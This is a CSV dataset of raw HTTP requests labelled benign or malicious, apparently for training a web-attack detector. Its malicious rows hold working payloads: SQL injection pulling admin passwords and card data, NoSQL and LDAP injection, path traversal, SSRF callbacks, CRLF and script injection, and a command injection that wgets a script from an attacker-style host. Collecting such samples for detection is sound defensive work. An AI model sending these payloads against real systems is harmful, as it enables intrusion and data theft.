label,text
benign,"GET /content/blog/post?id=1024&ref=homepage&lang=en HTTP/1.1
Host: creative-writers-hub.org
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: close"
benign,"POST /forum/new/thread HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 612
Referer: https://community.game-dev-forum.org/threads
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: user_session=abc123def456ghi789&preferences=threadView%3Dflat
X-CSRF-Token: WZx74F5qJyS3PkX2aVxTeMbHu8L9OwYdHPT1

title=How+to+optimize+movement+in+large+levels%3F&category=game+mechanics&tags=optimization%2Clevel+design%2Cperformance&body=I+have+a+big+map+and+players+complain+about+lag.+Any+tips+for+making+movement+smoother%3F+Also%2C+should+I+use+navmeshes+or+waypoints%3F&anonymous=no&notifyReplies=yes&subscribeThread=yes&font=default&priority=normal&language=en&showSignatures=yes&emailOnReply=yes&signature=Thanks%2C+John+G.&avatar=default&profileVisibility=public&allowMentions=yes&contentWarnings=no&threadType=discussion&allowEdits=yes&sticky=no&locked=no&moderatorReview=no"
benign,"GET /images/icons/favicon.ico HTTP/1.1
Host: portal-user-experience.ai
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Accept: image/x-icon,image/webp,image/apng,*/*;q=0.8
If-None-Match: W/""d7fae923b8""
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /user/profile/view?id=2879 HTTP/1.1
Host: urban-fashion-outlet.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cookie: lang=en-US; tracking_id=QxZb' OR IF(ASCII(SUBSTRING((SELECT password /*!FROM*/ users /*!WHERE*/ username='admin'),1,1))=0x61, SLEEP(5),0) -- ; promo_seen=yes
Referer: https://urban-fashion-outlet.biz/app/home"
malicious,"PUT /api/v1/accounts/edit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: text/plain
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Length: 90

user%5Bemail%5D=admin%40cloud-data-services.ai&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=1&user%5Broles%5D%5B%5D=3"
benign,"POST /signup HTTP/1.1
Host: green-living-blog.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Connection: close
Accept-Encoding: gzip, deflate
Referer: https://green-living-blog.org/signup
Cookie: session=abcde12345fghij67890

email=susan.carter%2Beco%40greenmail.info"
benign,"POST /csv/upload/user_contacts HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: text/csv
Content-Length: 92
DNT: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1

name,email,phone
Lena Harris,lena.harris@emailprovider.net,555-218-3344
Phil Nguyen,phil.nguyen@mailbox.org,555-876-9921"
malicious,"GET /static/..%2F..%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: media-api-cloud-images.acmecdn.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive"
malicious,"GET /internal/api/status HTTP/1.1
Host: gateway-edge-service.cloud-data-forge.net
User-Agent: Python-urllib/3.9
Accept: application/json
X-Callback-Server: http://internal-delay-check.dns-verify.zone/api/status
Cache-Control: max-age=0
Pragma: no-cache
Connection: close"
benign,"POST /api/v1/feedback HTTP/1.1
Host: smart-warehouse.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
User-Agent: curl/7.88.1
Accept: */*
X-Forwarded-For: 198.51.100.24
Connection: close

message=UPDATE+queries+are+crucial+when+modifying+inventory+records+in+response+to+real-time+sales+data."
benign,"POST /form/contact_submit HTTP/1.1
Host: silverpine-crafts.online
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
User-Agent: python-requests/2.31.0
Referer: https://silverpine-crafts.online/contact
Origin: https://silverpine-crafts.online
Cookie: sessionid=e8a7c32879dd43fb9054b2d82ac647c6
Accept-Encoding: gzip, deflate
Connection: keep-alive

name=Olivia+Martinez&email=olivia.martinez%40silverpine-crafts.online&subject=Order+assistance&message=Hi%2C+I+need+help+with+modifying+my+recent+order+placed+last+week.+Thanks!"
benign,"POST /api/v1/user/preferences/update HTTP/1.1
Host: appdata-sync-service.io
Authorization: Bearer Qp4C8VXYzeA7KwJn31dslv86Tar0qu9nRlHs
Content-Type: application/json
Idempotency-Key: 44d6d5e8-29bd-438f-9c75-89eebae86ff9
X-Request-ID: 2cfa1d98-bd9f-44bb-b38c-12a7f748532e
X-Client-Version: 4.12.3
Accept: application/json
X-Forwarded-For: 203.0.113.42
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Length: 102

{""userId"": ""usr-129372"", ""language"": ""fr-FR"", ""timezone"": ""Europe/Paris"", ""notifications"": {""email"": false, ""push"": true}}"
malicious,"POST /auth/redirect HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Referer: https://community.game-dev-forum.org/login
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
malicious,"GET /media/upload/filename%0d%0aX-Hacked:%20true%0d%0a%0d%0a<script>prompt('Injected')</script> HTTP/1.1
Host: file-hosting-service.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: keep-alive"
malicious,"POST /api/v1/process-event HTTP/1.1
Host: api.user-data-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
X-Webhook-URL: http://rebind-secure-gateway.ai/payload_trigger
Connection: keep-alive
Content-Length: 45

{""eventType"":""login"",""userId"":""87264f29-bd1e""}"
malicious,"GET /api/users/lookup?username=admin&password%5B%24ne%5D=1234 HTTP/1.1
Host: data-analytics-portal.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"GET /news/headlines/today HTTP/1.1
Host: global-info-digest.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Via: 1.1 varnish"
malicious,"POST /signature/check HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
benign,"POST /profile HTTP/1.1
Host: urban-photo-collective.org
Authorization: Bearer MTIzNDU2Nzg5OmFiY2RlZg==
Content-Type: application/json
Accept: application/json
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Length: 90

{""username"":""lensrunner"",""portfolioUrl"":""https://photos.urban-photo-collective.org/lensrunner"",""isAdmin"":false,""tags"":[""street"",""portrait"",""urban""]}"
benign,"GET /weather/forecast/new-york HTTP/1.1
Host: climate-watchers.org
User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36
Accept: text/html,application/xml
Accept-Language: en-US,en;q=0.7
Cache-Control: max-age=3600
Connection: keep-alive"
benign,"POST /profile/settings/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Referer: https://my-personal-blog-site.info/profile/settings/update
User-Agent: curl/7.89.0
Cookie: sessionid=f84293b67d8d434f896efbb7e2d7e0a2
Origin: https://my-personal-blog-site.info
Accept: */*

display_name=Clara+Williams&bio=Blogger+sharing+daily+stories+and+thoughts.&website_url=https%3A%2F%2Fclarawilliams.info&location=Chicago%2C+IL"
benign,"GET /forum/replies?thread=8675309&callback=processData HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/javascript, */*;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://community.game-dev-forum.org/thread/8675309
Connection: keep-alive
Accept-Encoding: gzip, deflate"
benign,"GET /community/latest-threads HTTP/1.1
Host: forum-dev-network.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: es-ES,es;q=0.9,en;q=0.8
Cookie: user_prefs_b64=eyJjdXJyZW50VGFiIjoic2VjdGlvbiIsInBhZ2VTaXplIjoyNSwiYmxpbmRTX3RvcyI6ZmFsc2V9
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0"
malicious,"PUT /api/configureDevice HTTP/1.1
Host: secure-device-mgmt.org
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 154
Origin: https://secure-device-mgmt.org

{""device_name"":""sensor-77"",""command"":""restart || wget http://malicious-update.cloud-data-services.ai/update.sh -O /tmp/update.sh"",""auth_token"":""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9""}"
benign,"POST /sessions/create HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
User-Agent: python-requests/2.28.2
Accept: */*
Connection: close

email=michael@personalblog.info&password=BlogPass1346&callback=/profile/edit"
benign,"GET /support/tickets/view?id=abf3492b-a0d9-45f8-a3eb-b57c06cba37f HTTP/1.1
Host: helpdesk-customercare.co
Accept: application/json
X-CSRF-Token: 7c3bfd57-edfe-4e47-a144-8c874555c9e2
Referer: https://helpdesk-customercare.co/support/home
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /app/user/settings/profile-picture HTTP/1.1
Host: api.cloud-data-services.ai
Accept: image/png,image/*;q=0.8,*/*;q=0.5
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Python-urllib/3.11
X-Forwarded-For: 203.0.113.45
Connection: keep-alive"
benign,"GET /search/%D1%82%D0%B5%D1%85%D0%BD%D0%BE%D0%BB%D0%BE%D0%B3%D0%B8%D0%B8?q=latest HTTP/1.1
Host: tech-portal-urals.ru
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /api/v4/inventory/update HTTP/1.1
Host: warehouse-inventory-management.io
Authorization: Bearer c3VwZXJzZWNyZXR0b2tlbg==
Content-Type: application/json
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 163
Connection: close

{""items[0].sku-id"": ""SKU12345-XYZ"", ""items[0].qty_available"": 57, ""items[1].sku-id"": ""SKU54321-ABC"", ""items[1].qty_available"": 130, ""last_updated.timestamp"": ""2024-06-02T10:00:00Z""}"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /dashboard/notifications HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
DNT: 1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamFja3MifQ.S5Dj1zX9uWabCqEhjXAlAL9lV1IeqY59JpCtk9hjzS0
Connection: keep-alive"
benign,"GET /shop/products/fashion/men/sneakers HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache"
benign,"GET /user/profile/view?user_id=48239&session_token=fp34lkdjl12&expand=contacts%2Csocial_links&show_activity=true&theme=dark&notifications=enabled&lang=es-ES&timezone=Europe%2FMadrid&page=1&per_page=25 HTTP/1.1
Host: portal-secure-user.net
Connection: keep-alive
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
malicious,"POST /secure/session/extend HTTP/1.1
Host: cloud-file-sharing.dev
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Referer: https://trusted-client.cloud-file-sharing.dev/premium
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Cookie: session_token=f7dc924ad8f649d9b47f33c92a62c1b6

extend=true&duration=30"
benign,"POST /orders/create HTTP/1.1
Host: shop-fresh-produce.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Referer: https://shop-fresh-produce.org/cart
Connection: keep-alive
Cookie: session_id=ed4f872e6342c820a9d09512341567da

item_id=342%26type=organic&quantity=10&notes=Please+pack+fresh%25%26don%27t+bruise+p%23lease"
benign,"GET /community/posts/recent?token=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ290aGNoIiwiYXVkIjoiY29tbXVuaXR5LmdhbWUtZGV2LWZvcnVtLm9yZyIsImV4cCI6MTY4MjA5NjQwMH0.d8NhX-FaL0L5iH_72pyUc43XXBFuII6_RaR9KzrPFzXj07VlTy9Zj-ZpTLxff8miNWlpTmF7vSVmzYfxnY3XMA HTTP/1.1
Host: community.game-dev-forum.org
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36
Connection: keep-alive"
benign,"GET /static/fonts/icons.woff2 HTTP/1.1
Host: design-agency-portfolio.dev
Accept: font/woff2,application/font-woff2,*/*;q=0.8
If-None-Match: ""c879d51a""
Connection: keep-alive
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-GB,en;q=0.9"
benign,"POST /session/logout HTTP/1.1
Host: community.game-dev-forum.org
Content-Length: 0
Referer: https://community.game-dev-forum.org/profile/settings
Cookie: logged_in=Y; session_uuid=e12f6789-abc4-46d7-8f1a-dcb9bbe97f42
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Connection: close"
malicious,"POST /v1/data/submit HTTP/1.1
Host: service.upload-center.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
X-Notification-Endpoint: http://ssrf-timebomb.space/check?task=49
Content-Type: application/json
Content-Length: 30

{""upload_id"":""3029"",""status"":""ok""}"
malicious,"POST /events/api/log HTTP/1.1
Host: realtime-ad-servicing.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 310
Referer: https://realtime-ad-servicing.ai/monitoring
Origin: https://realtime-ad-servicing.ai
Cache-Control: no-cache, no-store

{
  ""ad_id"": ""AD-668312"",
  ""event_details"": ""Ad impression recorded\"", ""status_code"": 200, ""user_id"": ""admin"", ""is_privileged"": true, ""original_event"": ""impression"""",
  ""timestamp"": ""2024-06-05T18:05:07Z""
}"
benign,"PUT /api/v3/items/112233/details HTTP/1.1
Host: inventory-management.systems
Authorization: Bearer 7f9a0c12d3e4b5a67890abcdef1234567890abcd
Origin: https://admin.inventory-management.systems
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: application/json
User-Agent: curl/7.88.1
Content-Length: 134
Connection: keep-alive

{""name"":""Wireless Keyboard"",""category"":""peripherals"",""stock"":45,""price"":{""amount"":39.99,""currency"":""USD""},""tags"":[""wireless"",""keyboard"",""bluetooth""]}"
benign,"POST /feedback/form HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/feedback
Connection: keep-alive

username=dev_guru%231&topic=Game+engine+optimization+%26+performance+tips&message=Found+your+#1+article+very+useful%21+Looking+forward+to+more+updates."
benign,"GET /index.html HTTP/1.1
Host: user-analytics-hub.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
User-Agent: curl/7.68.0"
malicious,"GET /directory_search?group=%29%28memberOf%3D*%29%29%7C%28cn%3D* HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml, text/xml
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /assets/images/gallery/photo_20230615.jpg HTTP/1.1
Host: photo-archive-service.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Range: bytes=0-1023
Accept-Language: en-GB,en;q=0.7
Connection: close
Cache-Control: no-cache"
malicious,"GET /items/filter?sort=asc&sort=desc&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: analytics.data-streams.xyz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Referer: https://analytics.data-streams.xyz/report
Connection: keep-alive"
malicious,"POST /api/v1/profile/filter HTTP/1.1
Host: user-data-analytics.io
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Origin: https://user-data-analytics.io
Referer: https://user-data-analytics.io/app/filter
X-Requested-With: FetchAPIClient
Cookie: sessionid=fa23b8e7d9c1449a

{""query"":{""$where"":""this.username === 'admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"POST /api/v1/accounts/update-details HTTP/1.1
Host: accounts-data-sync.net
Authorization: Bearer e3f1d824-9b3c-4f0f-b8f3-18e2dc456a10
Content-Type: application/json
Content-Length: 76
Idempotency-Key: 85c12f1a-37ab-4c6a-82f1-dfadf5877a32
X-Request-ID: 6490e9bd-34b3-4b0a-988f-60e221bb70de
X-Client-Version: 2.5.7
Accept: application/json
Connection: keep-alive

{""userId"":49237,""email"":""jane.doyle@securemail.biz"",""phone"":""+14475551234""}"
benign,"POST /login HTTP/1.1
Host: trusted-media-hub.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://trusted-media-hub.org/auth/login
Connection: keep-alive

user=andreww&pass=GoodPass99&callback=/user/profile/settings"
